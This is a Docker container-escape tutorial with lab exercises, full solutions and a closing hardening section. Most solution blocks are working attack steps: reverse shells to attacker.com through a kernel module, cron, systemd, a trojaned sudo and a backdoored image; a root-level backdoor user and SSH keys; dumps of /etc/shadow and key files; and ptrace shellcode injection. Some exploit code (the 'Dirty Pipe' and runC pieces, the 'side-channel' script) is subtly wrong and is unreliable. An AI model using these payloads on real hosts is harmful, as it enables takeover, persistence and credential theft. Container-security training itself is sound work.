# 🐳 Docker Container Escape Tutorial

**Difficulty**: ⭐⭐⭐⭐⭐ (Advanced)  
**Time Required**: 3 hours  
**Applications**: Docker Security Lab, Vulnerable containers

## 📚 Table of Contents
1. [What is Container Escape?](#what-is-container-escape)
2. [Container Security Model](#container-security-model)
3. [Common Escape Techniques](#common-escape-techniques)
4. [Hands-On Practice](#hands-on-practice)
5. [Defense Strategies](#defense-strategies)
6. [Additional Resources](#additional-resources)

---

## 🎯 Learning Objectives

By the end of this tutorial, you will:
- ✅ Understand Docker security architecture
- ✅ Identify container misconfigurations
- ✅ Exploit privileged containers
- ✅ Escape through volume mounts
- ✅ Implement container hardening

---

## What is Container Escape?

Container escape refers to breaking out of the container's isolated environment to access the host system. This compromises the security boundary that containers are meant to provide.

### 🎬 Real-World Impact

Container escapes have affected:
- **Tesla (2018)**: Kubernetes cluster compromise for cryptomining
- **Docker Hub (2019)**: Supply chain attack via malicious images
- **Capital One (2019)**: SSRF to container metadata to host
- **Microsoft Azure (2021)**: Container escape in ACI

### 🔍 Container vs VM

| Container | Virtual Machine |
|-----------|-----------------|
| Shares host kernel | Own kernel |
| Process isolation | Hardware virtualization |
| Namespaces & cgroups | Hypervisor |
| Lighter weight | More secure isolation |

---

## Container Security Model

### Linux Security Features

1. **Namespaces**: Resource isolation
   - PID, Network, Mount, UTS, IPC, User

2. **Cgroups**: Resource limits
   - CPU, Memory, I/O, Network

3. **Capabilities**: Fine-grained privileges
   - Instead of all-or-nothing root

4. **Seccomp**: System call filtering
   - Restrict dangerous syscalls

5. **AppArmor/SELinux**: Mandatory access control

### Common Weaknesses

- Privileged containers
- Mounted Docker socket
- Sensitive host paths
- Kernel vulnerabilities
- Capability abuse

---

## Common Escape Techniques

### 1. Privileged Container Abuse
Full host capabilities

### 2. Docker Socket Mount
Access to Docker daemon

### 3. Sensitive Path Mounts
Host filesystem access

### 4. Kernel Exploitation
Shared kernel vulnerabilities

### 5. Capability Abuse
CAP_SYS_ADMIN, CAP_SYS_PTRACE

### 6. Namespace Manipulation
PID, Network namespace escape

---

## Hands-On Practice

### 🏃 Exercise 1: Privileged Container Escape

**Setup**: Container running with `--privileged` flag  
**Goal**: Escape to host system

<details>
<summary>💡 Hint 1: Check your privileges</summary>

In a privileged container, check:
```bash
# Capabilities
capsh --print

# Devices
ls /dev

# SELinux/AppArmor status
sestatus
aa-status
```

What extra access do you have?

</details>

<details>
<summary>💡 Hint 2: Mount host filesystem</summary>

Privileged containers can access all devices. Look for:
- `/dev/sda1` or similar (host disk)
- `/dev/nvme0n1p1` (NVMe drives)

Can you mount these?

</details>

<details>
<summary>💡 Hint 3: Kernel modules</summary>

With privilege, you can:
- Load kernel modules
- Access `/proc/sys`
- Modify system settings

Think about persistence!

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Direct disk mount**
```bash
# Inside privileged container

# 1. Find host disk
fdisk -l
# Look for main disk, e.g., /dev/sda1, /dev/nvme0n1p1

# 2. Mount host filesystem
mkdir /host
mount /dev/sda1 /host

# 3. Access host files
chroot /host
# You're now on the host!

# 4. Add SSH key for persistence
mkdir -p /root/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys

# 5. Create backdoor user
useradd -ou 0 -g 0 backdoor
echo "backdoor:password" | chpasswd
```

**Method 2: Kernel module backdoor**
```bash
# Create malicious kernel module
cat > escape.c << 'EOF'
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>

static int __init escape_init(void) {
    static char *argv[] = {"/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1", NULL};
    static char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
    
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    return 0;
}

static void __exit escape_exit(void) {
    // Cleanup
}

module_init(escape_init);
module_exit(escape_exit);
MODULE_LICENSE("GPL");
EOF

# Compile (need kernel headers)
make -C /lib/modules/$(uname -r)/build M=$PWD modules

# Load module
insmod escape.ko
```

**Method 3: Process injection**
```bash
# With CAP_SYS_PTRACE in privileged mode
# Find host process
ps aux | grep -v "^root.*docker"

# Inject into host process
gdb -p [HOST_PID]
(gdb) call system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'")
(gdb) detach
(gdb) quit
```

</details>

---

### 🏃 Exercise 2: Docker Socket Escape

**Setup**: Container with Docker socket mounted  
**Goal**: Escape using Docker commands

<details>
<summary>💡 Hint 1: Check Docker access</summary>

Is the Docker socket mounted?
```bash
ls -la /var/run/docker.sock
docker ps
```

If yes, you can control Docker on the host!

</details>

<details>
<summary>💡 Hint 2: Create privileged container</summary>

With Docker access, you can:
- Start new containers
- With any privileges
- Mount any paths

What would be useful to mount?

</details>

<details>
<summary>💡 Hint 3: Break out</summary>

Think about creating a container that:
- Has full privileges
- Mounts the host root filesystem
- Gives you a shell

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Privileged container with host mount**
```bash
# Inside container with docker.sock

# Create escape container
docker run -it --rm \
  --privileged \
  -v /:/host \
  --pid=host \
  --network=host \
  alpine chroot /host bash

# You're now on the host with root!
```

**Method 2: Mount specific sensitive paths**
```bash
# Mount host etc for persistence
docker run -it --rm \
  -v /etc:/host_etc \
  -v /root:/host_root \
  alpine sh

# Inside new container
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /host_etc/crontab

# Or add SSH key
echo "ssh-rsa YOUR_KEY" >> /host_root/.ssh/authorized_keys
```

**Method 3: Container with capabilities**
```bash
# Create container with specific capabilities
docker run -it --rm \
  --cap-add=ALL \
  --security-opt apparmor=unconfined \
  --security-opt seccomp=unconfined \
  -v /proc:/host/proc \
  -v /sys:/host/sys \
  alpine sh

# Exploit capabilities
# With CAP_SYS_MODULE - load kernel modules
# With CAP_SYS_ADMIN - mount filesystems
```

**Method 4: Backdoor via image**
```bash
# Create malicious image
cat > Dockerfile << EOF
FROM alpine
RUN apk add --no-cache bash
RUN echo '* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /etc/crontabs/root
CMD ["/bin/sh"]
EOF

docker build -t backdoor .

# Run on host via socket
docker run -d \
  --name persistence \
  -v /:/host \
  --privileged \
  --restart unless-stopped \
  backdoor
```

</details>

---

### 🏃 Exercise 3: Capability and Namespace Escape

**Setup**: Container with specific capabilities  
**Goal**: Exploit capabilities for escape

<details>
<summary>💡 Hint 1: Enumerate capabilities</summary>

Check what you have:
```bash
capsh --print
cat /proc/self/status | grep Cap
getcap /usr/bin/*
```

Key dangerous capabilities:
- CAP_SYS_ADMIN
- CAP_SYS_PTRACE
- CAP_SYS_MODULE
- CAP_DAC_READ_SEARCH

</details>

<details>
<summary>💡 Hint 2: Exploit CAP_SYS_ADMIN</summary>

This capability allows:
- Mount operations
- Namespace operations
- Many other privileged operations

Can you create/enter namespaces?

</details>

<details>
<summary>💡 Hint 3: PID namespace escape</summary>

If you can see host processes:
- Check `/proc/[pid]/root`
- Use `nsenter`
- Inject into processes

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: CAP_SYS_ADMIN abuse**
```bash
# With CAP_SYS_ADMIN

# 1. Mount host filesystem via proc
mkdir /tmp/escape
mount -t proc none /tmp/escape
cd /tmp/escape/1/root
chroot . bash

# 2. Create user namespace escape
unshare -r -p -m -f -U -n bash
# Manipulate namespaces to access host
```

**Method 2: CAP_SYS_PTRACE exploitation**
```bash
# Find host processes
ps aux | grep -E "^root.*init|systemd"

# Inject shellcode into host process
cat > inject.c << 'EOF'
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
  "\x48\x31\xc0\x48\x89\xc2\x48\x89\xc6"
  "\x48\x8d\x3d\x04\x00\x00\x00\x0f\x05"
  "\x2f\x62\x69\x6e\x2f\x73\x68\x00";

int main(int argc, char *argv[]) {
    pid_t target = atoi(argv[1]);
    struct user_regs_struct regs;
    
    ptrace(PTRACE_ATTACH, target, NULL, NULL);
    wait(NULL);
    
    ptrace(PTRACE_GETREGS, target, NULL, &regs);
    
    // Write shellcode
    for(int i = 0; i < sizeof(shellcode); i++) {
        ptrace(PTRACE_POKETEXT, target, regs.rip + i, 
               *((long*)(shellcode + i)));
    }
    
    ptrace(PTRACE_DETACH, target, NULL, NULL);
    return 0;
}
EOF

gcc inject.c -o inject
./inject [HOST_PID]
```

**Method 3: CAP_DAC_READ_SEARCH for information**
```bash
# Read any file on system
find / -name "*.key" -o -name "*.pem" 2>/dev/null | while read f; do
    echo "=== $f ==="
    cat "$f" 2>/dev/null
done

# Extract shadow file
cat /etc/shadow > /tmp/shadow.txt

# Read Docker configs
cat /root/.docker/config.json
```

**Method 4: Namespace manipulation**
```bash
# If in host PID namespace
nsenter -t 1 -m -u -i -n -p bash

# Or manually
for ns in mnt uts ipc net pid user; do
    nsenter -t 1 -$ns
done
```

</details>

---

### 🏃 Exercise 4: Volume Mount Exploitation

**Setup**: Container with sensitive volumes mounted  
**Goal**: Exploit mounted paths for escape

<details>
<summary>💡 Hint 1: Enumerate mounts</summary>

Check what's mounted:
```bash
mount | grep -v docker
cat /proc/mounts
df -h
ls -la /
```

Look for unusual mount points!

</details>

<details>
<summary>💡 Hint 2: Sensitive directories</summary>

Common dangerous mounts:
- `/etc` - System configs
- `/var/run` - Runtime data
- `/sys` - Kernel interface
- `/dev` - Devices

What can you modify?

</details>

<details>
<summary>💡 Hint 3: Persistence techniques</summary>

With write access to host paths:
- Cron jobs
- Systemd services
- SSH keys
- User accounts

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: /etc mount exploitation**
```bash
# If /etc is mounted read-write

# Add cron job
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" >> /etc/crontab

# Create systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Note: Can't enable without systemctl access, but will start on reboot
```

**Method 2: /var/run exploitation**
```bash
# If Docker socket accessible
ls -la /var/run/docker.sock
# Use docker socket escape method

# If containerd socket accessible
ls -la /var/run/containerd/containerd.sock
# Use ctr for container manipulation
ctr -n moby container list
ctr -n moby container create --privileged --mount type=bind,src=/,dst=/host,options=rbind alpine sh
```

**Method 3: Host binary replacement**
```bash
# If /usr/bin or similar mounted
# Replace common binary with backdoor
cp /bin/bash /tmp/original_sudo
cat > /usr/bin/sudo << 'EOF'
#!/bin/bash
/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' &
/tmp/original_sudo "$@"
EOF
chmod +x /usr/bin/sudo
```

**Method 4: Kernel parameter manipulation**
```bash
# If /sys is mounted read-write
# Disable security features
echo 0 > /sys/kernel/modules_disabled
echo 0 > /sys/kernel/kptr_restrict

# Load kernel module
insmod /path/to/malicious.ko
```

</details>

---

### 🏃 Challenge: Advanced Container Escape

**Goal**: Escape from a hardened container

<details>
<summary>🎯 Challenge Overview</summary>

The container has:
- No privileges
- Read-only root filesystem
- No dangerous capabilities
- Seccomp filters
- AppArmor profile

Can you still escape?

</details>

<details>
<summary>💡 Hint: Kernel vulnerabilities</summary>

Even hardened containers share the kernel. Research:
- Dirty COW (CVE-2016-5195)
- Dirty Pipe (CVE-2022-0847)
- Recent kernel CVEs

</details>

<details>
<summary>🔓 Solution</summary>

**Method 1: Dirty Pipe exploitation (CVE-2022-0847)**
```c
// Requires vulnerable kernel < 5.16.11
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void exploit() {
    // Create pipe
    int p[2];
    pipe(p);
    
    // Fill pipe buffer
    write(p[1], "AAAAA", 5);
    
    // Drain pipe
    char buffer[5];
    read(p[0], buffer, 5);
    
    // Open target file
    int fd = open("/etc/passwd", O_RDONLY);
    
    // Splice with SPLICE_F_MOVE
    splice(fd, 0, p[1], NULL, 1, 0);
    
    // Write malicious data
    write(p[1], "root::0:0:root:/root:/bin/bash\n", 32);
    
    printf("Exploitation complete, su to root\n");
}
```

**Method 2: /proc/self/exe overwrite**
```bash
# Some containers allow /proc/self/exe write
# Check if possible
ls -la /proc/self/exe

# Overwrite with shell
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main() {
    int fd = open("/proc/self/exe", O_WRONLY);
    if (fd < 0) return 1;
    
    // Write shell to exe
    write(fd, "#!/bin/sh\n/bin/sh\n", 18);
    close(fd);
    
    // Execute
    execl("/proc/self/exe", "sh", NULL);
}
EOF

gcc /tmp/exploit.c -o /tmp/exploit
/tmp/exploit
```

**Method 3: runC vulnerability (CVE-2019-5736)**
```bash
# Overwrite runC binary when admin enters container
#!/bin/bash

# Wait for admin to exec into container
while true; do
    if [ -f /proc/self/exe ]; then
        # Overwrite runC
        cat > /proc/self/exe << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
EOF
        break
    fi
    sleep 1
done
```

**Method 4: Side-channel attacks**
```python
# Extract host information via timing/cache
import time

def measure_cache_timing(address):
    start = time.perf_counter_ns()
    # Access memory
    try:
        with open(f'/proc/1/maps', 'r') as f:
            data = f.read()
    except:
        pass
    end = time.perf_counter_ns()
    return end - start

# Measure timing differences to infer host activity
timings = []
for i in range(1000):
    timing = measure_cache_timing(0x7fff00000000)
    timings.append(timing)
    
# Analyze for patterns indicating host processes
```

</details>

---

## Defense Strategies

### 🛡️ Container Hardening

**1. Drop Privileges**
```yaml
# docker-compose.yml
services:
  app:
    image: myapp
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE  # Only what's needed
    read_only: true
    user: "1000:1000"  # Non-root user
```

**2. Seccomp Profiles**
```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["read", "write", "exit", "exit_group"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

**3. AppArmor/SELinux**
```bash
# AppArmor profile
profile docker-container flags=(attach_disconnected,mediate_deleted) {
  # Deny all file writes
  deny /** w,
  
  # Allow specific reads
  /usr/** r,
  /lib/** r,
  
  # Network
  network inet tcp,
  network inet udp,
  
  # Capabilities
  deny capability,
}
```

**4. Resource Limits**
```yaml
services:
  app:
    image: myapp
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          memory: 256M
    ulimits:
      nproc: 65535
      nofile:
        soft: 20000
        hard: 40000
```

### 🛡️ Runtime Security

**1. Falco Rules**
```yaml
- rule: Container Escape Attempt
  desc: Detect potential container escape
  condition: >
    container and
    (proc.name in (container_escape_binaries) or
     (spawned_process and proc.pname in (init, systemd)))
  output: >
    Container escape attempt (user=%user.name container=%container.name
    command=%proc.cmdline)
  priority: CRITICAL
```

**2. gVisor/Kata Containers**
```bash
# Use gVisor for additional isolation
docker run --runtime=runsc myapp

# Or Kata Containers for VM-level isolation
docker run --runtime=kata myapp
```

**3. Admission Controllers**
```yaml
# Pod Security Policy
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
  runAsUser:
    rule: 'MustRunAsNonRoot'
  seLinux:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
```

---

## 📊 Container Security Checklist

### Build Time
- [ ] Minimal base images
- [ ] No secrets in images
- [ ] Non-root user
- [ ] Security scanning
- [ ] Signed images

### Runtime
- [ ] Drop all capabilities
- [ ] Read-only root filesystem
- [ ] No privileged containers
- [ ] Seccomp profiles
- [ ] AppArmor/SELinux

### Monitoring
- [ ] Runtime threat detection
- [ ] Anomaly detection
- [ ] Audit logging
- [ ] Network monitoring
- [ ] File integrity monitoring

---

## 🏆 Skill Check

Before moving on, make sure you can:

- [ ] Identify container security weaknesses
- [ ] Exploit privileged containers
- [ ] Escape via Docker socket
- [ ] Abuse Linux capabilities
- [ ] Implement container hardening

---

## Additional Resources

### 🔧 Tools
- **amicontained**: Container introspection
- **deepce**: Docker enumeration
- **CDK**: Container penetration toolkit
- **Falco**: Runtime security
- **Tracee**: Runtime security and forensics

### 📖 Further Reading
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [NIST Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
- [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)

### 🎥 Video Resources
- [Container Escape Techniques - Black Hat](https://www.youtube.com/watch?v=BQlqita2D2s)
- [Kubernetes Security Best Practices](https://www.youtube.com/watch?v=oBf5lrmquYI)

---

**Next Tutorial**: [Kubernetes Security](kubernetes.md) → 